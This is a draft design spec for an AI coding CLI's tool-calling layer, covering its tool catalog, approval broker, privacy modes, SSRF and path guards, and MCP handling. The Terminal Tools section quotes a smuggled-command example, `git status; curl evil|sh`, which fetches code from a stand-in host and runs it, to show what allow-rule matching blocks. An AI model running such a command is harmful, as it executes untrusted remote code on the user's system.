# AGI CLI — Volume 11 — Tool Calling

Status: Draft spec
Owner: Founder + platform lead
Last updated: 2026-07-01

Authority: `AGENTS.md`, `docs/current/source-of-truth.md`, `docs/products/README.md`, `apps/cli/AGENTS.md`, and the implementing sources: `apps/cli/src/platform/runtime/tool_catalog.rs`, `apps/cli/src/features/exec/tools/` (`mod.rs`, `web/mod.rs`, `git/mod.rs`, `registry.rs`), `apps/cli/src/agent/{mod.rs,executor.rs,tools.rs}`, `apps/cli/src/permissions.rs`, `apps/cli/src/tui/approval_broker.rs`, `apps/cli/src/approval_audit.rs`, `apps/cli/src/mcp/`, `crates/agiworkforce-app-server/src/lib.rs`.

## Overview & stance

This volume specifies how the AGI CLI agent calls tools: the catalog it exposes to the model, how each tool executes, and how destructive or external actions are gated. The CLI runs Local + BYOK + Managed (`PrivacyMode::{Local,Byok,Managed}` in `apps/cli/src/agent/mod.rs`), and tool calling never crosses those boundaries silently. A Local session that selects a non-local model is blocked by `validate_privacy_boundary()`; a Local→BYOK move is an explicit fork armed by `arm_byok_handoff` and consented only via `consume_byok_handoff` — drafting alone never leaves Local. Tool calls (web_search, web_fetch, advisor) that reach the network inherit the session's privacy mode, so a Local session cannot exfiltrate context through a tool. Sessions are workspace/session-scoped; tool output never auto-syncs to app chat. The catalog is provider-neutral: the same tools serve any model routed through Local, BYOK, or Managed. The volume-wide rule is: **destructive/external actions are always approval-gated.**

## File System Tools

✅ Built (`apps/cli/src/platform/runtime/tool_catalog.rs`, `apps/cli/src/features/exec/tools/file_ops/mod.rs`). Read tools — `read_file` (optional `start_line`/`end_line`, 100k cap), `search_files`, `grep_files` (ripgrep), `glob`, `list_directory`, `read_many_files` — are marked `read_only` + `is_concurrency_safe` and resolve through the C1 Tool-trait registry (`build_read_only_registry`), bypassing confirmation because they are side-effect-free. Mutating tools — `write_file` (overwrite), `edit_file` (unique exact-string replace), `multiedit` (atomic multi-edit), `apply_patch` (unified diff), `notebook_edit` — carry `permission_class = "mutating"` and are approval-gated. Requirements: every write path is validated by `crate::path_security::validate_workspace_path`; paths outside the workspace or registered additional roots must be rejected; `read_file` must precede overwrite. Result-size caps (e.g. `read_file` 100k, `write_file`/`edit_file` 5k) are catalog-enforced.

## Terminal Tools

✅ Built (`apps/cli/src/features/exec/tools/bash/mod.rs`). `run_command` executes a shell command (stdout/stderr, 50k cap); `powershell` is a distinct Windows tool with `safe_mode` and checks for destructive verbs, registry paths, and ExecutionPolicy bypass. Both are mutating and route through `execute_run_command(..., require_confirm, approval_callback)`. Requirement: allow-rules use token-prefix matching (`token_prefix_matches` in `apps/cli/src/permissions.rs`, AUDIT-FIX C-2) so an allow on `git status` cannot smuggle `git status; curl evil|sh` — any trailing shell metacharacter voids the match. Pattern rules like `Bash(cargo *)` scope approvals to command families.

## Git Tools

🟡 Partial. Git worktree wrappers — `enter_worktree`, `exit_worktree`, `list_worktrees` — are ✅ Built in `apps/cli/src/features/exec/tools/git/mod.rs`; mutating ones are approval-gated (`ApprovalRequestKind::Exec`) and fire `WorktreeCreate`/`WorktreeRemove` hooks. General git operations (status/add/commit/diff/push) run today through `run_command` (✅ via shell) — there is no dedicated typed `git_commit`/`git_diff` toolset. Dedicated structured git tools with per-operation approval semantics are 🔭 Planned; until then, all git mutation inherits `run_command` approval gating, and pushes to remotes must stay approval-gated as external actions.

## HTTP Tools

✅ Built (`apps/cli/src/features/exec/tools/web/mod.rs`). `web_fetch` retrieves and extracts text from a URL (200k cap, `read_only`) via `reqwest`. Requirements enforced by `validate_fetch_url`: only `http`/`https` schemes; loopback, private/internal, and cloud-metadata hosts are blocked (`is_private_or_internal_ip`), including IPv4-mapped IPv6; DNS-rebinding is blocked by re-checking resolved addresses; redirects run under a custom policy that re-validates each hop. There is deliberately **no** generic arbitrary-method HTTP client (POST/PUT/DELETE to any host) as a model tool — that surface is 🔭 Planned and, if built, must be approval-gated and SSRF-guarded on the same path.

## Web Search

✅ Built (`apps/cli/src/features/exec/tools/web/mod.rs`). `web_search` (`read_only`, 100k cap, `query` + optional `max_results`) queries a configured backend — Brave or Tavily, selected by available API key (referenced from source; keys are user/managed-supplied). Requirements: results are text-summarized within the cap; a Local-mode session performs no network search unless the boundary is explicitly crossed; managed-mode search may meter against the account's plan. Do not hardcode a search-engine list in prose that would drift from source.

## MCP Tools

✅ Built (`apps/cli/src/mcp/`: `mod.rs`, `http.rs`, `sse.rs`, `connection_pool.rs`, `oauth_flow.rs`, `oauth_store.rs`, `resources.rs`, `elicitation.rs`, `status.rs`). `McpManager` discovers external MCP servers, exposes their `tool_definitions()`, and dispatches via `execute_mcp_tool` (`apps/cli/src/agent/tools.rs`). MCP tools are appended last in `effective_tool_definitions` and, lacking read-only catalog metadata, are treated as mutating: `is_plan_mode_mutating_tool` returns `true` for unknown/MCP names, so they are locked in unapproved plan mode and approval-gated at execution. Requirements: MCP servers honor OAuth flows and elicitation; MCP tool failures return a structured `ToolResult` error, never a panic.

## User Confirmation

✅ Built. The `ask_user` tool (`permission_class = "interactive"`) asks a clarifying question and blocks for a reply; the non-TUI path falls back to `dialoguer::Confirm`. Requirement: confirmation prompts render the concrete action (`describe_command`) so the user approves what will actually run, not a paraphrase. `ask_user` is for information/clarification and must not be used to bypass the approval broker for a mutating action.

## Permission Requests

✅ Built (`apps/cli/src/permissions.rs`, `apps/cli/src/tui/approval_broker.rs`, `apps/cli/src/approval_audit.rs`). The broker resolves an `ApprovalRequest` to `ApprovalDecision::{AllowOnce, AllowSession, AlwaysAllow, Deny}`; `is_allowing()` gates execution and a "Deny All" latch resolves the rest of the turn as cancelled. Persistence: `AllowSession` writes to a process-scoped set (`PROCESS_SESSION_ALLOW`); `AlwaysAllow` persists to the on-disk `PermissionStore` (`always_allow`, plus path+operation-scoped `file:<op>:<path>` keys via `FilePermissionOperation`). Requirements: decisions are recorded to the approval audit; `/permissions reset` clears saved rules; `--skip-permissions`/`auto_approve_safe` may auto-allow only `read_only` catalog tools, never mutating ones; `PermissionMode::Plan` blocks mutating tools until a plan is accepted.

## Tool Execution Pipeline

✅ Built (`apps/cli/src/features/exec/tools/mod.rs`, `apps/cli/src/agent/executor.rs`). `execute_tool_with_opts` canonicalizes the tool name (`canonical_tool_name` resolves reference-style aliases like `Read`→`read_file`, `Bash`→`run_command`), routes read-only tools through the trait registry, computes `require_confirm = require_confirmation && !(auto_approve_safe && is_safe_tool)`, then dispatches. Deferred tools are excluded from the initial schema list and loaded on demand via `tool_search`; the initial list is `always_loaded_tool_definitions()` (the catalog defines a test-locked set of built-in tools plus 4 team tools — verify counts from `tool_catalog.rs`, do not restate them without checking). Loop safety: `hash_tool_call` with `LOOP_DETECTION_THRESHOLD = 5`, `detect_content_loop`, and `MAX_AGENTIC_ITERATIONS = 25`. `allowed_tools`/`disallowed_tools` filter the effective list (including `Bash(cargo *)` patterns). The `agiworkforce-app-server` JSON-RPC/WS host (`crates/agiworkforce-app-server`) exposes this same pipeline to embedders. Requirement: a catalog entry and a runtime dispatcher must exist for every tool (enforced by `catalog_builtin_tools_have_runtime_dispatch`).

## Repository map

- `apps/cli/src/platform/runtime/tool_catalog.rs` — tool definitions, aliases, permission classes, read-only/deferred metadata, size caps.
- `apps/cli/src/features/exec/tools/` — executors: `mod.rs` (dispatch + approval), `file_ops/`, `bash/`, `dir_ops/`, `web/`, `git/`, `task_registry/`, `registry.rs` (C1 read-only trait registry), `common/`.
- `apps/cli/src/agent/{mod.rs,executor.rs,tools.rs}` — session, privacy modes, tool-call/loop plumbing, team/MCP dispatch.
- `apps/cli/src/permissions.rs`, `apps/cli/src/tui/approval_broker.rs`, `apps/cli/src/approval_audit.rs` — permission store, approval broker, audit.
- `apps/cli/src/mcp/` — MCP client, transports, OAuth, elicitation, resources.
- `crates/agiworkforce-app-server/src/lib.rs` — JSON-RPC/WS tool host.

## Competitor notes

Claude Code, Codex CLI, and ChatGPT expose a comparable file/shell/search/fetch/MCP tool loop. AGI's deliberate divergence: (1) **multi-provider by design** — one catalog serves any model via Local, BYOK, or Managed, not a single vendor; (2) **explicit trust boundaries** — `PrivacyMode` blocks a Local session from silently using a network tool, and Local→BYOK is a consented fork, which single-trust competitors do not model; (3) **local-first defaults** — Local + BYOK are free access modes, not plans, and BYOK is CLI/Desktop/VS Code only; (4) **hardened tool primitives** — token-prefix allow matching, SSRF/DNS-rebinding guards, path validation, and per-path approval scoping. Remote control of a running CLI session from phone/web (parity: Claude Code Remote Control, Codex remote connections) is 🔭 Planned; when built, remote clients get a text-command subset and every tool call stays approval-gated on the host.

## Acceptance / Definition of Done

The domain is production-ready when every mutating or external tool is approval-gated, read-only tools stay side-effect-free, catalog and dispatch are in lockstep, and privacy boundaries hold under tool execution.

- [ ] Build: `cargo test -p agiworkforce-cli --lib` passes, including catalog/dispatch parity, size-cap, and read-only/concurrency invariants.
- [ ] Trust: a Local session cannot call a network tool without an explicit, consented boundary crossing; MCP tools are treated as mutating; tool output never auto-syncs to app chat.
- [ ] Security: SSRF/DNS-rebinding guards reject internal hosts; token-prefix allow-matching blocks metacharacter injection; approvals are audited and path-scoped; `--skip-permissions` auto-allows read-only tools only.

## Anti-patterns

- Auto-approving mutating or external tools, or letting `auto_approve_safe` cover anything not `read_only`.
- Routing a Local session's tool calls to BYOK/Managed without the explicit fork (context selection, secret scan, payload preview, provider label, consent).
- Adding a tool executor without a catalog entry (or vice versa), or shipping a raw arbitrary-HTTP tool without the SSRF/redirect guard.
- Weakening path validation or allow-rule matching; panicking in a tool path instead of returning a structured error.
- Hardcoding model IDs, restating tool/command counts without checking source, referencing removed tiers (Plus/Hobby/pro_plus) or credit top-ups, referencing Supabase, using `agiworkforce <cmd>` in examples, or auto-syncing CLI tool results into app chat.
